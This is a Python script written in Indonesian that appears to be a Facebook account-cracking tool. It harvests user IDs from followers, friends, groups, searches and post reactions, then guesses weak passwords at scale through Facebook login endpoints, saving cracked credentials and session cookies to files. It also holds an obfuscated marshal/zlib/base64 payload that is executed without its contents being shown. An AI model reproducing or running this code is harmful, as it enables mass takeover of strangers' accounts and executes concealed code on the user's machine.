# Mau Ngapain Bro?:v
# Recode? jangan di ganti author nya ajg, dan sertakan sumber!!!:v
# fb me : https://m.facebook.com/Kang.Pacman
# wa me : +6283805812588
import os,sys,re,json,random,ua
from time import sleep as waktu
from shutil import rmtree as hapus
from concurrent.futures import ThreadPoolExecutor as Bool
ok=0
cp=0
die=0
cot=0
live=[]
chek=[]
hitung=""
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try:
	import requests as req
except ModuleNotFoundError:
	os.system("python -m pip install requests");restart()
try:
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	os.system("python -m pip install bs4");restart()
try:hapus("__pycache__")
except:pass
def hasil(ngocok,ismylife):
	if len(ngocok) != 0 or len(ismylife) != 0:
		print(f"\n[+] Done\n[+] LIVE : {len(ngocok)}\n[+] CHEK : {len(ismylife)}")
		if len(ngocok)==0:pass
		else:print("[+] Hasil Live Tersimpan Di File : live.txt")
		if len(ismylife)==0:pass
		else:print("[+] Hasil Chek Tersimpan Di File : chek.txt")
		exit()
	else:exit("\n[!] Tidak Mendapatkan Hasil:(")
class ngentod:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol) 
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				else:
					self.id.append(softek[0]+"[SagiriWaifuGw:v]"+softek[1])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def babaturan(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
			if "Lihat selengkapnya" in kontol:
				self.babaturan(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def memekgrup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				else:
					self.id.append(softek[0]+"[SagiriWaifuGw:v]"+softek[1])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
			if "Lihat Selengkapnya" in kontol:
				self.memekgrup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def teangan(self,hencet):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"[SagiriWaifuGw:v]"+softek[2])
				elif "?refid=" in softek[1]:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"[SagiriWaifuGw:v]"+softek[2])
				else:
					self.id.append(softek[1]+"[SagiriWaifuGw:v]"+softek[2])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
				if len(self.id)==1000:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.teangan(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"))
		except:pass
	def flrencang(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
			if "Lihat Teman Lain" in kontol:
				self.flrencang(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
	def menta(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
				print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
			if "Lihat selengkapnya" in kontol:
				self.menta(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			if "Semua 0" in kontol:
				print("[!] Tidak Ada Yang Menanggapi Postingan, Awokawokawok Kasian Akun Nya Sepi:v");waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"[SagiriWaifuGw:v]"+softek[1])
					print(f"\r[+] Mengumpulkan Id {len(self.id)}",end="")
				if "Lihat Selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def menu(self):
		about().tentang()
		pilih=input("[?] Pilih : ")
		if pilih in["1","01"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[+] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.folower(memek)
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["2","02"]:
			self.babaturan(f"{self.url}/friends/center/friends/")
		elif pilih in["3","03"]:
			while True:
				kontol=input("[?] Masukkan Id Grup : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "Konten Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						else:
							print("[+] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
							self.memekgrup(f"{self.url}/browse/group/members/?id={kontol}");break
					except req.exceptions.ConnectionError:
						exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["4","04"]:
			while True:
				kontol=input("[?] Nama : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "Maaf, kami tidak menemukan" in ajg:
							print(f"[!] Pengguna Dengan Nama {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						else:
							self.teangan(f"{self.url}/search/people/?q={kontol}");break
					except req.exceptions.ConnectionError:
						exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["5","05"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f"[!] Daftar Teman Tidak Di Publikasikan");waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[+] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.flrencang(memek)
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["6","06"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Permintaan" in ajg:
					print("[!] Permintaan Pertemanan Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					self.menta(f"{self.url}/friends/center/requests/#friends_center_main")
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["7","07"]:
			kontol=input("[?] Url/Id Postingan : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/{kontol}"
			elif "m.facebook.com" in kontol:
				memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in kontol:
				memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in kontol:
				memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
			else:
				memek=kontol
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
					print(f"[!] Posting Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					try:
						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0]
						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
					except IndexError:
						print("[!] Error, Silahkan Masukkan Id/Url Postingan Dengan Benar");waktu(1);self.menu()
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
			except req.exceptions.MissingSchema:
				print(f"[!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
		elif pilih=="98":
			print("[+] Silahkan Hubungi WhatsApp Saya 083805812588");os.system("xdg-open http://wa.me/+6283805812588?text=assalamualaikum");input("[+] Enter Untuk Kembali Ke Menu > ");waktu(2);self.menu()
		elif pilih=="99":
			try:os.remove("cookie")
			except:os.system("rm cookie")
			exit()
		elif pilih in["0","00"]:
			exit("[+] Thank You For Using My Tool")
		elif pilih in[""," "]:
			print("[!] Jangan Kosong Bro");waktu(0.8);self.menu()
		else:
			print("[!] Pilihan Tidak Ada");self.menu()
		if len(self.id)!=0:
			print("\n\n  -=[ Pilih Metode Crack ]=-")
			print("[1] Metode Api Fb (Mode Crack Cepat)")
			print("[2] Metode mbasic (Mode Crack Lambat)")
			self.ngontol()
		else:
			print("Gagal Mengambil ID, Silahkan Coba Lagi");waktu(1.5);self.menu()
	def crackapi(self,user,pw):
		global ok,cp,die,cot,hitung
		if hitung!=user:
			hitung=user
			cot+=1
		ses=req.Session()
		api="https://b-api.facebook.com/method/auth.login"
		param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
		send=ses.get(api,params=param)
		if "session_key" in send.text and "EAAA" in send.text:
			ok+=1
			print(f"\r\x1b[1;32m[LIVE] {user} | {pw}\x1b[0m\n",end="")
			open("live.txt","a").write(f"{user} | {pw}\n")
			live.append(f"{user}{pw}")
		elif "www.facebook.com" in send.json()["error_msg"]:
			cp+=1
			print(f"\r\x1b[1;33m[CHEK] {user} | {pw}\x1b[0m\n",end="")
			open("chek.txt","a").write(f"{user} | {pw}\n")
			chek.append(f"{user}{pw}")
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def login_mbasic(self,user,pw):
		global ok,cp,die,cot,hitung
		if hitung!=user:
			hitung=user
			cot+=1
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","origin":"https://mbasic.facebook.com","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		kontol=ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8")
		ses.headers.update({"cookie":";".join([f"{key}={value}" for key,value in kontol.cookies.get_dict().items()])})
		list_data=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for x in parser(kontol.text,"html.parser")("input"):
			if x.get("name") in list_data:
				data[x.get("name")]=x.get("value")
			else:
				continue
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		memek=ses.post("https://mbasic.facebook.com"+parser(kontol.text,"html.parser").find("form").get("action"),data=data)
		if "c_user" in memek.cookies:
			ok+=1
			kuki=";".join([f"{key}={value}" for key,value in memek.cookies.get_dict().items()])
			print(f"\r\x1b[1;32m[LIVE] {user} | {pw} | {kuki}\x1b[0m\n",end="")
			open("live.txt","a").write(f"{user} | {pw} | {kuki}\n")
			live.append(f"{user}{pw}{kuki}")
		elif "checkpoint" in memek.cookies:
			cp+=1
			print(f"\r\x1b[1;33m[CHEK] {user} | {pw}\x1b[0m\n",end="")
			open("chek.txt","a").write(f"{user} | {pw}\n")
			chek.append(f"{user}{pw}")
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def ngontol(self):
		nanya=input("[?] Pilih : ")
		if nanya in[""," "]:
			print("[!] Jangan Kosong Bro");self.ngontol()
		elif nanya in["1","01"]:
			print("\n[+] Starting Crack..\n[+] Hasil LIVE Tersimpan Di File : live.txt\n[+] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[SagiriWaifuGw:v]")
						xu=xi[1]
						xe=xu.split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						else:
							pewe=["Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						for pwas in pewe:
							tokai.submit(self.crackapi,xi[0],pwas)
					except:pass
			hasil(live,chek)
		elif nanya in["2","02"]:
			print("\n[+] Starting Crack..\n[+] Hasil LIVE Tersimpan Di File : live.txt\n[+] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[SagiriWaifuGw:v]")
						xu=xi[1]
						xe=xu.split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						else:
							pewe=["Sayang","Mantan","Kontol","Bangsat","Anjing","freefire"]
						for pwas in pewe:
							tokai.submit(self.login_mbasic,xi[0],pwas)
					except:pass
			hasil(live,chek)
		else:
			print("[!] Isi Yang Bener Ajg");self.ngontol()
def logo():
	os.system("clear")
	print("""\x1b[1;36m          ╔╦╗┌┐ ┌─┐  ╔═╗┌┐ \x1b[1;31mv.1.0
\x1b[1;32m          ║║║├┴┐├┤───╠╣ ├┴┐
\x1b[1;35m          ╩ ╩└─┘└    ╚  └─┘
\x1b[1;37m    -=[ Create By Kang Pacman ]=-\x1b[0m""")
class about:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
	def tentang(self):
		try:
			anjir=req.get(f"{self.url}/me",cookies=kueh).text
		except req.exceptions.ConnectionError:
			exit("[!] Kesalahan Pada Koneksi")
		if "Facebook - Masuk atau Daftar" in anjir or "Masuk ke Facebook" in anjir or "<title>Facebook</title>" in anjir:
			os.remove("cookie");exit("[!] Cookies Kedaluwarsa, Harap Login Ulang")
		else:
			logo()
			print("+"+"~"*40+"+")
			print(f"[*] Uid  : {tentang.get('uid')}")
			print(f"[*] Nama : {tentang.get('nama')}")
			print(f"[*] Username : {tentang.get('username')}")
			print("+"+"~"*40+"+")
			print("[01] Crack Dari Followers")
			print("[02] Crack Dari Daftar Teman")
			print("[03] Crack Dari Member Group")
			print("[04] Crack Dari Pencarian Nama")
			print("[05] Crack Dari Daftar Teman Target")
			print("[06] Crack Dari Permintaan Pertemanan")
			print("[07] Crack Dari Reaction Post")
			print("[98] Laporkan Masalah")
			print("[99] Logout")
			print("[00] Exit")
			print("+"+"~"*40+"+")
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'eJxtVL1v3DYUJ6mPu5PPH4kNJCmMQkWXXpve7YGRBjGKfqQ9FHCKtLINgSfyZFkSeaGo2BbOk7N26trhPGbp3D+l4NChnTJn69RHnd2kRk9475Hv8cff755I/YVu/BywR2BvNsF9gRhi+CXYBYkQI3uo98pJbkLIFaTaBsdRhBmKCMOMvESRwxzmQnSZt4cGvnFpVc8ScgNtbdfusAaO4TnO8BzFQA4YMjZ+ImWe8QE2bl7n2YAYt+LFNHISmb9CqgOgv7dHFUuoYqMqUXQ2KifTT6eTkWUbzs5MN44zkek4tkxVS4+b1bZ6XUnwO6I8sO61qD/ANb9pdIxBGjomjPxEjp1zzJw5zn31q3aZq72Fz7w5viTMv4fuINa5gy4wRrrDum10Wc9G5rOg6Ja9c9KOV4qgXDl3MJo7ducFZv1LfIEX/UsEOfJu7tydu4tVm9drrM9WL8hi/W390nJssDXLIbowWrejZ0iELgLlt45v54H6HSP7QHXDVn9EgvywbPKtcfP+kdaz6sEIWkerLBlOacIn0PdhIstRCc2POsvXUEVbyyVxIVNZ63hSay1FsxkE+58chl/S7H74jBcA42Fz92BHZ7rgBw8/Gn782WDnYHQ1fW3b3AThOOVCS/bgxWvb/+bD/Q8Ow2/lkRTh01qkaR3u8QmsoOrtSjgHnZQKzUVqj0QmplK5ADb4pB5C3P/zl58Pw29kmonwMVdHoLW4H35NCypyKsLvIabhUymLKhyf0WYLdAPpbvvnwq/EC1pkrHnP5p7wClBHAPqOMho+kYLnVTbYjBzFnxsn5VrZk2JczU+18WYqE9oQxU1nmglGiyLyTmiu6yigdBbTKRUsU31ARL1WdQnS1Kqd++WZzUS+4hQojCtnXBjvRGWaG5efZjoK+GnCZzqTojLru1IIntjJ50pJNfCUb7dxEp5HfXoi82uLVoD6qluxwbS9LUtnD7jxCtsn274qbK8FwbdxF2+DdXEfni28AVfhLgpIHypN0F6aFjQeePZiCVryODZBHJeS1YUd9+P4eU2LZUX1LNm9f2n/K0DZD4599ZXVAKSkzYwHuI3/BzHdnSXTQ4t7Y1X/A1PrNG8=', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'obf.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
if __name__=="__main__":
	try:
		kueh={"cookie":open("cookie").read()}
	except FileNotFoundError:
		os.system("clear")
		print("\n[!] Untuk Cara Mendapatkan Cookie Nya Cari Aja Di Yutub:V\n[!] Segala Resiko Di Tanggung Sendiri\n")
		while True:
			a=input("[?] Masukkan Cookie : ")
			if a in[""," "]:
				print("[!] Jangan Kosong")
			else:
				asup(a).login()
	try:
		tentang=json.loads(open("my_info").read())
	except FileNotFoundError:
		from informasi import info as aapganteng_
		aapganteng_(kueh.get("cookie")).myinfo();restart()
	ngentod().menu()
		
		
		
"""
Create By Aap Afandi Ganteng
GITHUB : https://github.com/KangPacman
"""